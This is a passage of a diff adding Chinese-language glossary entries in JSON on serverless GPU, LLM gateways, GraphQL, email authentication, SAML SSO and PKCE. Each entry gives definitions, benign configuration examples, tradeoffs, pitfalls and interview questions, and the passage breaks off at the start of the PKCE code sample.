+  "def": "无服务器 GPU（Serverless GPU）指由平台按请求自动启动、扩缩和回收 GPU 容器，用户只为实际运行时间（通常按秒）付费，无需管理服务器。它属于模型部署与基础设施层，适合部署自定义或开源模型、负载波动大的推理与批处理任务。代表平台有 Modal、Replicate、RunPod Serverless 等，核心挑战是冷启动。",
+  "how": [
+   "开发者定义容器镜像（依赖、模型权重来源）、GPU 类型和处理函数，提交到平台。",
+   "请求到达时，若无热容器，平台调度 GPU、启动容器并加载模型权重，即冷启动。",
+   "容器处理请求，平台根据排队长度与并发上限自动扩容出更多 GPU 副本。",
+   "空闲超过设定时间后容器被回收并停止计费；可配置最小常驻副本消除冷启动，但需持续付费。",
+   "冷启动优化手段包括：权重放入镜像或高速卷、容器启动时预加载模型、内存/GPU 快照等平台特性。"
+  ],
+  "terms": [
+   {
+    "t": "冷启动 (Cold Start)",
+    "d": "从零启动容器并加载模型到可服务的延迟。"
+   },
+   {
+    "t": "缩容到零 (Scale to Zero)",
+    "d": "无请求时不保留实例，不产生计算费用。"
+   },
+   {
+    "t": "最小副本数 (Min Containers)",
+    "d": "常驻热实例数量，以费用换取无冷启动。"
+   },
+   {
+    "t": "空闲回收窗口 (Scaledown Window)",
+    "d": "最后一次请求后容器保持存活的时间。"
+   },
+   {
+    "t": "模型权重卷 (Volume)",
+    "d": "持久化存储权重，避免每次启动重新下载。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "Modal 部署 GPU 推理函数",
+   "src": "import modal\n\nimage = modal.Image.debian_slim().pip_install(\"transformers\", \"torch\", \"accelerate\")\napp = modal.App(\"qwen-api\", image=image)\n\n@app.cls(gpu=\"A10G\", scaledown_window=300)   # 空闲 5 分钟后回收\nclass Model:\n    @modal.enter()                    # 容器启动时加载一次，之后的请求复用\n    def load(self):\n        from transformers import pipeline\n        self.pipe = pipeline(\"text-generation\", model=\"Qwen/Qwen2.5-0.5B-Instruct\",\n                             device_map=\"cuda\")\n\n    @modal.method()\n    def generate(self, prompt: str) -> str:\n        out = self.pipe(prompt, max_new_tokens=128)\n        return out[0][\"generated_text\"]\n\n@app.local_entrypoint()\ndef main():\n    print(Model().generate.remote(\"用一句话介绍 KV 缓存\"))\n# 运行：modal run app.py   部署：modal deploy app.py",
+   "note": "@modal.enter 把模型加载放在容器启动时；scaledown_window 控制空闲回收时间。"
+  },
+  "table": {
+   "title": "GPU 推理部署方式对比",
+   "head": [
+    "方式",
+    "计费",
+    "冷启动",
+    "适用"
+   ],
+   "rows": [
+    [
+     "托管模型 API",
+     "按 Token",
+     "无（平台承担）",
+     "通用大模型能力"
+    ],
+    [
+     "Serverless GPU",
+     "按秒运行时间",
+     "有，秒级到分钟级",
+     "自定义模型、波动负载"
+    ],
+    [
+     "专用 GPU 实例",
+     "按小时/包月",
+     "无（常驻）",
+     "稳定高负载"
+    ],
+    [
+     "自建 GPU 集群",
+     "硬件 + 运维",
+     "无",
+     "超大规模、强合规"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "缩容到零",
+    "pros": "空闲零成本",
+    "cons": "首个请求承受冷启动",
+    "when": "低频调用、内部工具"
+   },
+   {
+    "opt": "保留最小副本",
+    "pros": "无冷启动、延迟稳定",
+    "cons": "空闲时持续付费",
+    "when": "面向用户的实时接口"
+   },
+   {
+    "opt": "批处理队列模式",
+    "pros": "高利用率、成本低",
+    "cons": "非实时",
+    "when": "离线生成、批量打标"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "每次启动都从 Hugging Face 下载权重",
+    "fix": "把权重放进镜像或持久化卷，并在容器启动时预加载"
+   },
+   {
+    "bad": "在请求处理函数里加载模型",
+    "fix": "模型加载放在容器初始化钩子中，只执行一次"
+   },
+   {
+    "bad": "设置常驻副本后忘记，空闲照常计费",
+    "fix": "按时段调整最小副本数，设置预算告警"
+   },
+   {
+    "bad": "选了远超需要的 GPU 型号",
+    "fix": "按模型显存与吞吐需求选择型号，压测后再定"
+   }
+  ],
+  "checklist": [
+   "权重缓存在镜像或卷中",
+   "模型在容器启动阶段加载",
+   "测量冷启动与热请求延迟",
+   "最小副本与空闲窗口按流量设定",
+   "设置并发上限与预算告警",
+   "接口有鉴权"
+  ],
+  "interview": [
+   {
+    "q": "Serverless GPU 和托管模型 API 如何选择？",
+    "a": "需要通用强模型、无定制需求，用托管 API 最省事；需要运行自定义/微调/开源模型（含图像、语音），或数据控制要求高、负载波动大，用 Serverless GPU。持续高负载时专用实例可能更便宜。"
+   },
+   {
+    "q": "冷启动由哪些部分组成？",
+    "a": "调度 GPU 机器、拉取镜像、启动容器与运行时、下载或读取权重、把权重加载到 GPU 并完成初始化。大模型通常以权重传输和加载为主，可通过缓存、预加载与快照缩短。"
+   },
+   {
+    "q": "如何估算 Serverless GPU 成本？",
+    "a": "单次请求 GPU 秒数 × 每秒单价 × 请求量，加上冷启动与空闲窗口内的计费时间、常驻副本费用。再与托管 API 按 Token 成本和专用实例月费对比。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Modal 文档：GPU acceleration",
+    "url": "https://modal.com/docs/guide/gpu"
+   },
+   {
+    "title": "Modal 文档：Cold start performance",
+    "url": "https://modal.com/docs/guide/cold-start"
+   },
+   {
+    "title": "RunPod 文档：Serverless overview",
+    "url": "https://docs.runpod.io/serverless/overview"
+   }
+  ]
+ },
+ {
+  "slug": "llm-gateway",
+  "def": "模型网关（LLM Gateway）是位于应用与多个模型提供方之间的代理层，对外提供统一（通常为 OpenAI 兼容）的接口，集中处理鉴权、密钥托管、路由、降级、限流、缓存、日志与成本核算。它属于 AI 应用的基础设施层，开源自托管代表是 LiteLLM Proxy，托管聚合服务代表是 OpenRouter。",
+  "how": [
+   "应用使用网关签发的虚拟密钥，以统一格式发送请求，不直接持有各厂商的真实密钥。",
+   "网关校验虚拟密钥对应的团队、预算与速率限制，超额则拒绝或排队。",
+   "根据模型别名与路由策略（成本、延迟、负载、权重）选择具体提供方与部署，并转换为该厂商的 API 格式。",
+   "调用失败、超时或触发限流时，按配置重试或降级到备用模型。",
+   "记录请求的 Token 用量、费用、延迟与错误，发送到日志、可观测与计费系统。"
+  ],
+  "terms": [
+   {
+    "t": "虚拟密钥 (Virtual Key)",
+    "d": "网关签发给应用的密钥，可绑定预算、模型白名单与限额。"
+   },
+   {
+    "t": "模型别名 (Model Alias)",
+    "d": "应用使用的逻辑模型名，网关映射到具体厂商模型。"
+   },
+   {
+    "t": "降级 (Fallback)",
+    "d": "主模型失败时自动改用备用模型或提供方。"
+   },
+   {
+    "t": "语义缓存 (Semantic Cache)",
+    "d": "对语义相近的请求复用历史响应，降低成本。"
+   },
+   {
+    "t": "OpenAI 兼容接口",
+    "d": "沿用 OpenAI API 格式，现有 SDK 只需改 base_url。"
+   }
+  ],
+  "code": {
+   "lang": "yaml",
+   "title": "LiteLLM Proxy 配置",
+   "src": "# config.yaml   启动：litellm --config config.yaml\nmodel_list:\n  - model_name: main            # 应用里使用的别名\n    litellm_params:\n      model: openai/gpt-4o-mini\n      api_key: os.environ/OPENAI_API_KEY\n  - model_name: backup\n    litellm_params:\n      model: anthropic/claude-3-5-haiku-20241022   # 模型 ID 以厂商当前列表为准\n      api_key: os.environ/ANTHROPIC_API_KEY\n\nlitellm_settings:\n  num_retries: 2\n  fallbacks: [{\"main\": [\"backup\"]}]   # main 失败后改用 backup\n\ngeneral_settings:\n  master_key: os.environ/LITELLM_MASTER_KEY   # 管理与签发虚拟密钥\n# 应用侧：OpenAI SDK 设 base_url=http://网关地址:4000，model=\"main\"",
+   "note": "真实密钥只在网关环境变量中；应用用别名调用，主模型失败自动切到备用。"
+  },
+  "table": {
+   "title": "网关方案对比",
+   "head": [
+    "方案",
+    "部署",
+    "特点"
+   ],
+   "rows": [
+    [
+     "LiteLLM Proxy",
+     "自托管（开源）",
+     "支持大量提供方，虚拟密钥与预算"
+    ],
+    [
+     "OpenRouter",
+     "托管 SaaS",
+     "一个账号访问多家模型，统一计费"
+    ],
+    [
+     "云厂商 AI 网关",
+     "托管",
+     "与自家云的日志、缓存、限流集成"
+    ],
+    [
+     "自研代理",
+     "自托管",
+     "完全可控，维护成本高"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "自托管网关",
+    "pros": "数据与密钥自控，可深度定制",
+    "cons": "需运维，网关本身成为关键依赖",
+    "when": "合规要求高、多团队共用"
+   },
+   {
+    "opt": "托管聚合服务",
+    "pros": "零运维，快速接入多模型",
+    "cons": "多一层数据经手方与加价/费用",
+    "when": "原型与中小团队"
+   },
+   {
+    "opt": "应用内 SDK 直连",
+    "pros": "最少组件、延迟最低",
+    "cons": "密钥分散，难统一计费与降级",
+    "when": "单应用、单模型"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "网关单实例部署，挂了所有 AI 功能一起挂",
+    "fix": "多副本部署、健康检查，必要时客户端保留直连兜底"
+   },
+   {
+    "bad": "降级到能力差异大的模型却不评估",
+    "fix": "备用模型经过同一评测集验证，或对关键任务限制降级"
+   },
+   {
+    "bad": "日志记录完整提示与输出，含用户隐私",
+    "fix": "按需脱敏或只记录元数据，设置日志保留期"
+   },
+   {
+    "bad": "只设全局预算，不区分团队与用户",
+    "fix": "按虚拟密钥/团队设预算与速率限制，避免单个应用耗尽额度"
+   }
+  ],
+  "checklist": [
+   "厂商真实密钥只存在网关",
+   "每个应用/团队独立虚拟密钥与预算",
+   "主备模型及降级规则经过评测",
+   "网关高可用并有监控告警",
+   "日志脱敏与保留策略明确",
+   "流式输出经网关验证正常"
+  ],
+  "interview": [
+   {
+    "q": "模型网关和普通 API 网关有何不同？",
+    "a": "除鉴权、限流等通用能力外，模型网关理解 LLM 语义：按 Token 计量计费、跨厂商格式转换、模型级降级与路由、流式响应处理、提示缓存与语义缓存、内容安全检查等。"
+   },
+   {
+    "q": "降级策略要注意什么？",
+    "a": "区分可重试错误（超时、429、5xx）与不可重试错误（参数错误、内容拒绝）；备用模型需支持相同功能（工具调用、结构化输出、上下文长度）；记录降级次数并告警。"
+   },
+   {
+    "q": "如何用网关控制 Agent 成本失控？",
+    "a": "为 Agent 使用的虚拟密钥设置预算与速率上限；按任务路由到合适大小的模型；开启缓存；监控每个任务的 Token 消耗，异常时熔断。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "LiteLLM 文档：Proxy Server",
+    "url": "https://docs.litellm.ai/docs/simple_proxy"
+   },
+   {
+    "title": "LiteLLM 文档：Fallbacks & Reliability",
+    "url": "https://docs.litellm.ai/docs/proxy/reliability"
+   },
+   {
+    "title": "OpenRouter 文档：Quickstart",
+    "url": "https://openrouter.ai/docs/quickstart"
+   }
+  ]
+ },
+ {
+  "slug": "graphql",
+  "def": "GraphQL 是一种 API 查询语言及其运行时规范，由 Facebook 开发并于 2015 年开源，现由 GraphQL Foundation 维护。服务端用强类型 Schema 描述数据图，客户端在一个端点上精确声明需要的字段与关联，服务端按查询结构返回同形状的 JSON。它属于 API 设计层，解决 REST 的过度获取、获取不足与多次往返问题。",
+  "how": [
+   "服务端用 SDL 定义 Schema：对象类型、字段、参数，以及 Query、Mutation、Subscription 入口。",
+   "客户端发送查询文档（通常 POST 到单一端点），声明所需字段的嵌套结构与变量。",
+   "服务端解析并依据 Schema 校验查询，可在此加入深度、复杂度等自定义校验规则。",
+   "执行阶段按字段调用解析器（resolver）获取数据，子字段的解析器以父对象为输入逐层执行。",
+   "结果按查询形状组装为 JSON，字段级错误放入 errors 数组，部分成功时仍返回 data。"
+  ],
+  "terms": [
+   {
+    "t": "Schema / SDL",
+    "d": "用 Schema 定义语言描述的类型系统，是前后端契约。"
+   },
+   {
+    "t": "解析器 (Resolver)",
+    "d": "为某个字段获取数据的函数。"
+   },
+   {
+    "t": "内省 (Introspection)",
+    "d": "查询 Schema 自身结构的能力，供工具生成文档与代码。"
+   },
+   {
+    "t": "DataLoader",
+    "d": "在一次请求内批量合并与缓存加载，缓解 N+1 查询。"
+   },
+   {
+    "t": "持久化查询 (Persisted Queries)",
+    "d": "客户端只发送预注册查询的标识，限制任意查询。"
+   }
+  ],
+  "code": {
+   "lang": "typescript",
+   "title": "Apollo Server 加深度限制",
+   "src": "import { ApolloServer } from \"@apollo/server\";\nimport { startStandaloneServer } from \"@apollo/server/standalone\";\nimport depthLimit from \"graphql-depth-limit\";\n\nconst typeDefs = `#graphql\n  type Order { id: ID!, amount: Float! }\n  type User  { id: ID!, name: String!, orders: [Order!]! }\n  type Query { user(id: ID!): User }\n`;\n\nconst resolvers = {\n  Query: { user: (_: unknown, { id }: { id: string }) => db.users.find(id) },\n  User:  { orders: (u: { id: string }) => db.orders.byUser(u.id) }, // 生产中用 DataLoader 批量\n};\n\nconst server = new ApolloServer({\n  typeDefs, resolvers,\n  validationRules: [depthLimit(5)],   // 拒绝嵌套超过 5 层的查询\n});\nconst { url } = await startStandaloneServer(server, { listen: { port: 4000 } });\nconsole.log(url);\n// 客户端：query { user(id: \"1\") { name orders { amount } } }",
+   "note": "客户端只拿 name 与 orders.amount；depthLimit 在校验阶段拦截恶意深层嵌套。db 为示例数据层。"
+  },
+  "table": {
+   "title": "REST、GraphQL、gRPC 对比",
+   "head": [
+    "维度",
+    "REST",
+    "GraphQL",
+    "gRPC"
+   ],
+   "rows": [
+    [
+     "端点",
+     "按资源多个 URL",
+     "通常单一端点",
+     "按服务方法"
+    ],
+    [
+     "返回形状",
+     "服务端决定",
+     "客户端声明",
+     "Protobuf 定义"
+    ],
+    [
+     "HTTP 缓存",
+     "天然支持 GET 缓存",
+     "需额外方案",
+     "不适用"
+    ],
+    [
+     "典型场景",
+     "公开 API、简单 CRUD",
+     "复杂前端、多端聚合",
+     "内部服务间高性能调用"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "GraphQL",
+    "pros": "按需取数、强类型、单次请求聚合",
+    "cons": "缓存、限流、安全需额外设计",
+    "when": "多客户端、数据关系复杂"
+   },
+   {
+    "opt": "REST",
+    "pros": "简单、HTTP 缓存与工具成熟",
+    "cons": "过度/不足获取，多次往返",
+    "when": "资源型 CRUD、公开 API"
+   },
+   {
+    "opt": "BFF（为前端定制的 REST 层）",
+    "pros": "按页面聚合，简单可控",
+    "cons": "每端维护一层，重复代码",
+    "when": "端少、页面固定"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "不限制查询深度与复杂度，遭遇 DoS",
+    "fix": "加深度/复杂度限制、超时，公开 API 用持久化查询"
+   },
+   {
+    "bad": "每个字段解析器单独查库，产生 N+1",
+    "fix": "用 DataLoader 批量加载，或在父解析器预取"
+   },
+   {
+    "bad": "生产环境对外开放内省，暴露完整 Schema",
+    "fix": "按需关闭公开内省，并在解析器中做字段级授权"
+   },
+   {
+    "bad": "只在网关做鉴权，忽略字段级权限",
+    "fix": "在解析器或指令层按用户校验每个敏感字段"
+   }
+  ],
+  "checklist": [
+   "有深度、复杂度与超时限制",
+   "关联字段使用 DataLoader",
+   "字段级授权已实现",
+   "错误信息不泄露内部细节",
+   "Schema 变更遵循弃用流程"
+  ],
+  "interview": [
+   {
+    "q": "GraphQL 如何解决 N+1 问题？",
+    "a": "解析器按字段逐个执行，列表中每个元素查一次关联会产生 N+1。DataLoader 在同一事件循环 tick 内收集所有 key，合并为一次批量查询并在请求内缓存结果。"
+   },
+   {
+    "q": "GraphQL 为什么缓存比 REST 难？",
+    "a": "通常所有查询都 POST 到同一 URL，HTTP 层无法按 URL 缓存；响应形状因查询而异。常用客户端规范化缓存、持久化查询配合 GET 与 CDN、或服务端按字段缓存。"
+   },
+   {
+    "q": "GraphQL 如何做版本演进？",
+    "a": "官方倡导无版本演进：新增字段不破坏旧查询，废弃字段用 @deprecated 标注并监控使用量，确认无人使用后再删除。必要时配合 Schema 变更检查工具在 CI 中拦截破坏性改动。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "GraphQL 官方：Learn",
+    "url": "https://graphql.org/learn/"
+   },
+   {
+    "title": "GraphQL 规范",
+    "url": "https://spec.graphql.org/"
+   },
+   {
+    "title": "Apollo Server 文档",
+    "url": "https://www.apollographql.com/docs/apollo-server"
+   }
+  ]
+ },
+ {
+  "slug": "email-authentication",
+  "def": "邮件发信认证是一组基于 DNS 的标准，用来证明邮件确实由声称的域名授权发出：SPF（RFC 7208）声明哪些服务器可以代表域名发信，DKIM（RFC 6376）对邮件做加密签名，DMARC（RFC 7489）要求对齐并规定验证失败的处理策略与报告。它属于邮件投递与反钓鱼层，是事务邮件进入收件箱的前提。",
+  "how": [
+   "SPF：域名发布 TXT 记录列出允许的发信 IP 或第三方服务，收件方检查信封发件人（Return-Path）域名的 SPF。",
+   "DKIM：发信方用私钥对邮件头与正文签名，写入 DKIM-Signature 头；收件方从 selector._domainkey.域名 取公钥验证。",
+   "DMARC：收件方检查 SPF 或 DKIM 至少一项通过，且其域名与用户看到的 From 域名对齐。",
+   "未通过时按 DMARC 策略 p=none（仅监控）、quarantine（隔离/垃圾箱）或 reject（拒收）处理。",
+   "收件方把聚合报告发送到 rua 指定地址，域名所有者据此发现未授权或配置错误的发信源。"
+  ],
+  "terms": [
+   {
+    "t": "SPF (Sender Policy Framework)",
+    "d": "通过 DNS 列出允许代表域名发信的服务器。"
+   },
+   {
+    "t": "DKIM (DomainKeys Identified Mail)",
+    "d": "用私钥签名邮件，公钥发布在 DNS 供验证。"
+   },
+   {
+    "t": "DMARC",
+    "d": "基于 SPF/DKIM 的对齐要求、失败处理策略与报告机制。"
+   },
+   {
+    "t": "对齐 (Alignment)",
+    "d": "SPF 或 DKIM 验证的域名与 From 头域名一致（严格或宽松）。"
+   },
+   {
+    "t": "Selector",
+    "d": "DKIM 公钥的 DNS 名称前缀，便于多密钥并存与轮换。"
+   }
+  ],
+  "code": {
+   "lang": "text",
+   "title": "DNS 记录示例",
+   "src": "; SPF：只允许 Google Workspace 和某发信服务代发；~all 表示其他来源软失败\nexample.com.                 TXT \"v=spf1 include:_spf.google.com include:sendgrid.net ~all\"\n\n; DKIM：selector 为 s1，公钥由发信服务提供（此处截断）\ns1._domainkey.example.com.   TXT \"v=DKIM1; k=rsa; p=MIIBIjANBgkqh...\"\n\n; DMARC：先监控，报告发到指定邮箱；稳定后逐步改为 quarantine/reject\n_dmarc.example.com.          TXT \"v=DMARC1; p=none; rua=mailto:dmarc@example.com; adkim=r; aspf=r\"\n\n; 验证：\n;   dig +short TXT example.com\n;   dig +short TXT _dmarc.example.com\n; 发一封邮件到 Gmail，查看「显示原始邮件」中 SPF/DKIM/DMARC 是否为 PASS",
+   "note": "include 的具体值以发信服务商文档为准；DMARC 建议从 p=none 观察报告后再收紧。"
+  },
+  "table": {
+   "title": "三项标准对比",
+   "head": [
+    "标准",
+    "验证对象",
+    "DNS 位置",
+    "主要局限"
+   ],
+   "rows": [
+    [
+     "SPF",
+     "信封发件人域名与发信 IP",
+     "域名 TXT",
+     "转发后常失效；DNS 查询上限 10 次"
+    ],
+    [
+     "DKIM",
+     "邮件签名完整性",
+     "selector._domainkey",
+     "邮件被修改后签名失效"
+    ],
+    [
+     "DMARC",
+     "与 From 域名对齐 + 策略",
+     "_dmarc 子域 TXT",
+     "依赖 SPF/DKIM 至少一项对齐通过"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "p=none",
+    "pros": "不影响投递，收集报告",
+    "cons": "无法阻止仿冒",
+    "when": "刚开始部署、梳理发信源"
+   },
+   {
+    "opt": "p=quarantine",
+    "pros": "可疑邮件进垃圾箱",
+    "cons": "配置错误会误伤正常邮件",
+    "when": "报告显示合法源已全部对齐"
+   },
+   {
+    "opt": "p=reject",
+    "pros": "最强防仿冒",
+    "cons": "误配置直接导致退信",
+    "when": "长期稳定、发信源清晰"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "一个域名发布多条 SPF 记录",
+    "fix": "合并为一条 v=spf1 记录，多条会导致 SPF 永久错误"
+   },
+   {
+    "bad": "SPF include 过多，超过 10 次 DNS 查询",
+    "fix": "精简 include，移除不再使用的服务"
+   },
+   {
+    "bad": "营销与事务邮件共用同一域名",
+    "fix": "用子域分开（如 mail.、notify.），隔离信誉"
+   },
+   {
+    "bad": "直接设 p=reject 而未检查报告",
+    "fix": "从 p=none 开始分析 rua 报告，逐步收紧"
+   }
+  ],
+  "checklist": [
+   "只有一条 SPF 记录且查询次数未超限",
+   "每个发信服务都配置了 DKIM",
+   "DMARC 已发布并接收报告",
+   "测试邮件 SPF/DKIM/DMARC 均 PASS 且对齐",
+   "事务邮件使用独立子域"
+  ],
+  "interview": [
+   {
+    "q": "SPF 通过了，DMARC 为什么还会失败？",
+    "a": "DMARC 要求对齐：SPF 检查的是信封发件人（Return-Path）域名，若它是发信服务商的域名，与 From 域名不一致，则 SPF 虽通过但不对齐。需配置自定义 Return-Path 或依靠对齐的 DKIM。"
+   },
+   {
+    "q": "邮件转发为什么常导致认证失败？",
+    "a": "转发服务器以自己的 IP 重新投递，原域名的 SPF 不包含它；DKIM 若邮件未被修改仍可通过，所以 DKIM 对 DMARC 更可靠。ARC 协议用于在转发链中保留认证结果。"
+   },
+   {
+    "q": "大型邮箱服务对批量发信有哪些要求？",
+    "a": "Gmail 与 Yahoo 自 2024 年起要求大批量发件人配置 SPF、DKIM 与 DMARC，并提供一键退订、控制垃圾投诉率。具体阈值以各家官方指南为准。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "RFC 7208：SPF",
+    "url": "https://datatracker.ietf.org/doc/html/rfc7208"
+   },
+   {
+    "title": "RFC 6376：DKIM",
+    "url": "https://datatracker.ietf.org/doc/html/rfc6376"
+   },
+   {
+    "title": "RFC 7489：DMARC",
+    "url": "https://datatracker.ietf.org/doc/html/rfc7489"
+   },
+   {
+    "title": "Google：Email sender guidelines",
+    "url": "https://support.google.com/mail/answer/81126"
+   }
+  ]
+ },
+ {
+  "slug": "sso-saml",
+  "def": "单点登录（SSO）让用户通过一次认证访问多个应用；SAML 2.0（OASIS 于 2005 年发布）是企业 SSO 的主流协议之一，以 XML 签名断言在身份提供方（IdP，如 Okta、Microsoft Entra ID）与服务提供方（SP，你的应用）之间传递身份。它属于身份与访问管理层，是 SaaS 进入企业市场的常见门槛，常与 SCIM 自动开通账号搭配。",
+  "how": [
+   "双方交换元数据：SP 提供 Entity ID 与 ACS（断言消费服务）URL，IdP 提供 SSO URL 与签名证书。",
+   "SP 发起：用户访问应用，SP 生成 AuthnRequest，通过浏览器重定向到 IdP。",
+   "IdP 认证用户（密码、MFA 等），生成包含用户标识与属性的断言并用私钥签名。",
+   "浏览器把 SAMLResponse 以 POST 方式提交到 SP 的 ACS URL。",
+   "SP 验证签名、受众、有效期与 InResponseTo，映射到本地账号并建立会话。"
+  ],
+  "terms": [
+   {
+    "t": "身份提供方 (IdP)",
+    "d": "负责认证用户并签发断言的系统，如 Okta、Entra ID。"
+   },
+   {
+    "t": "服务提供方 (SP)",
+    "d": "依赖 IdP 认证结果的应用，即你的产品。"
+   },
+   {
+    "t": "断言 (Assertion)",
+    "d": "IdP 签名的 XML 声明，包含主体、属性与条件。"
+   },
+   {
+    "t": "ACS URL",
+    "d": "SP 接收 SAMLResponse 的回调地址。"
+   },
+   {
+    "t": "SCIM",
+    "d": "跨域身份管理协议，用于自动创建、更新、停用用户账号。"
+   },
+   {
+    "t": "IdP 发起登录 (IdP-initiated)",
+    "d": "用户从 IdP 门户点击进入应用，无 SP 请求。"
+   }
+  ],
+  "code": {
+   "lang": "json",
+   "title": "python3-saml 的 SP 配置",
+   "src": "{\n  \"strict\": true,\n  \"sp\": {\n    \"entityId\": \"https://app.example.com/saml/metadata\",\n    \"assertionConsumerService\": {\n      \"url\": \"https://app.example.com/saml/acs\",\n      \"binding\": \"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\"\n    },\n    \"NameIDFormat\": \"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\"\n  },\n  \"idp\": {\n    \"entityId\": \"http://www.okta.com/exk_example\",\n    \"singleSignOnService\": {\n      \"url\": \"https://example.okta.com/app/example/sso/saml\",\n      \"binding\": \"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect\"\n    },\n    \"x509cert\": \"MIIDpDCCAoygAwIBAgIG...\"\n  }\n}",
+   "note": "strict 模式会严格校验签名、受众与时间；IdP 的 ID、URL 与证书来自客户提供的元数据（示例值）。"
+  },
+  "table": {
+   "title": "企业身份协议对比",
+   "head": [
+    "协议",
+    "数据格式",
+    "主要用途"
+   ],
+   "rows": [
+    [
+     "SAML 2.0",
+     "XML 签名断言",
+     "企业 Web SSO，存量 IdP 支持广"
+    ],
+    [
+     "OpenID Connect",
+     "JSON / JWT",
+     "现代 Web 与移动登录"
+    ],
+    [
+     "SCIM 2.0",
+     "JSON REST",
+     "用户与组的自动开通与停用"
+    ],
+    [
+     "LDAP",
+     "目录协议",
+     "内网目录查询与认证"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "自研 SAML 集成",
+    "pros": "无第三方费用，完全掌控",
+    "cons": "XML 签名安全细节多，易出漏洞",
+    "when": "安全团队强、客户少"
+   },
+   {
+    "opt": "身份中间层服务（如 WorkOS、Auth0）",
+    "pros": "快速支持多种 IdP 与 SCIM",
+    "cons": "按连接或用户付费，引入依赖",
+    "when": "需要快速满足企业客户"
+   },
+   {
+    "opt": "只支持 OIDC",
+    "pros": "实现简单、现代",
+    "cons": "部分企业 IdP 配置或政策要求 SAML",
+    "when": "客户以现代 IdP 为主"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "只验证断言存在，不严格校验签名",
+    "fix": "使用成熟库并开启严格模式，校验签名、受众、有效期"
+   },
+   {
+    "bad": "XML 解析存在签名包装攻击风险",
+    "fix": "使用维护良好的库，禁止外部实体，只信任已验证的签名节点"
+   },
+   {
+    "bad": "只做 SSO 登录，不做账号停用",
+    "fix": "接入 SCIM 或定期同步，员工离职后自动停用"
+   },
+   {
+    "bad": "按邮箱自动合并已有账号，被用于接管",
+    "fix": "按租户校验已验证域名，合并前确认归属"
+   }
+  ],
+  "checklist": [
+   "使用成熟 SAML 库并启用严格校验",
+   "按租户隔离 IdP 配置与证书",
+   "支持证书轮换",
+   "支持 SCIM 或等效停用机制",
+   "SSO 强制时禁用密码登录",
+   "登录事件写入审计日志"
+  ],
+  "interview": [
+   {
+    "q": "SAML 和 OIDC 怎么选？",
+    "a": "OIDC 基于 OAuth 2.0 与 JWT，对移动端和 API 友好、实现简单；SAML 基于 XML，企业存量 IdP 支持最广。面向企业的 SaaS 往往两者都支持，新项目优先 OIDC，并按客户需求提供 SAML。"
+   },
+   {
+    "q": "IdP 发起登录有什么安全风险？",
+    "a": "没有 SP 的 AuthnRequest，无法用 InResponseTo 绑定请求，更易受断言重放与登录 CSRF 影响。需校验断言一次性使用、短有效期，或引导为 SP 发起流程。"
+   },
+   {
+    "q": "SSO 之外企业客户通常还要求什么？",
+    "a": "SCIM 自动开通与停用、强制 SSO（禁用密码）、基于组的角色映射、审计日志、会话超时策略，以及多个已验证域名管理。这些常出现在企业采购的安全问卷中。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OASIS：SAML 2.0 Technical Overview",
+    "url": "https://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html"
+   },
+   {
+    "title": "OWASP：SAML Security Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html"
+   },
+   {
+    "title": "SAML-Toolkits/python3-saml (GitHub)",
+    "url": "https://github.com/SAML-Toolkits/python3-saml"
+   }
+  ]
+ },
+ {
+  "slug": "pkce",
+  "def": "PKCE（Proof Key for Code Exchange，RFC 7636）是 OAuth 2.0 授权码流程的扩展：客户端为每次授权生成随机 code_verifier，授权请求只发送其哈希 code_challenge，用授权码换令牌时再提交原文，授权服务器比对后才发放令牌。它属于身份认证协议层，防止授权码被截获后冒用；RFC 9700（OAuth 2.0 安全最佳实践）建议所有客户端使用。",
+  "how": [
+   "客户端生成高熵随机字符串 code_verifier（43–128 个字符），保存在本地会话中。",
+   "计算 code_challenge = BASE64URL(SHA256(code_verifier))，method 为 S256。",
+   "授权请求携带 code_challenge 与 code_challenge_method，授权服务器将其与签发的授权码绑定。",
+   "回调拿到授权码后，客户端在令牌请求中提交 code 与原始 code_verifier。",
+   "授权服务器重新计算哈希并比对，一致才签发令牌；截获授权码者因没有 verifier 无法兑换。"
+  ],
+  "terms": [
+   {
+    "t": "code_verifier",
+    "d": "客户端每次授权生成的随机密钥原文，只在换令牌时发送。"
+   },
+   {
+    "t": "code_challenge",
+    "d": "verifier 的 SHA-256 哈希经 Base64URL 编码，在授权请求中发送。"
+   },
+   {
+    "t": "S256 / plain",
+    "d": "两种转换方法；plain 直接发原文，仅在无法计算 SHA-256 时使用。"
+   },
+   {
+    "t": "公共客户端 (Public Client)",
+    "d": "无法安全保存密钥的客户端，如 SPA、移动 App。"
+   },
+   {
+    "t": "授权码拦截攻击",
+    "d": "恶意应用或日志截获重定向中的授权码并抢先兑换令牌。"
+   }
+  ],
+  "code": {
+   "lang": "javascript",
+   "title": "浏览器生成 PKCE 参数",
